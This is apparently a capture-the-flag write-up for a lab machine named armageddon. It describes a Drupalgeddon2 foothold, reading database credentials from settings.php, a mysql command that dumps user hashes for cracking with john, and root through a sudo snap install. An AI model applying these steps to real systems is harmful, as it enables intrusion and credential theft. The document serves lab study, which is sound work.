## Enum

http
ssh

HTTP is running a Drupal 7 webpage.

## Foothold

brute force exploit? SQLI?
Looks suitable exploit: https://www.exploit-db.com/exploits/34992
Doesn't work, but a different variant does!: https://github.com/dreadlocked/Drupalgeddon2

## PrivEsc

From settings.php:
 * database: drupal
 * username: drupaluser
 * password: CQHEy@9M\*m23gBVj
 * driver: mysql

Can also exfil the user list via /etc/password. The best target is brucetherealadmin but unfortunately the leaked password is not his.

The exploit shell doesn't have interactivity, but we can still execute mysql commands:
`mysql -D drupal -u drupaluser --password=CQHEy@9M*m23gBVj -e 'select * from users;'`

to extract user details. This gets us a hash for bruce and it cracks quickly with `john`.

## Root

bruce has a lot of sudo priveleges:


```
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME
    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

The env stuff looks tasty, but `snap` as sudo looks like it's straightforward to exploit:
https://gtfobins.github.io/gtfobins/snap/

Craft a snap package that cats out root.txt during the install step.
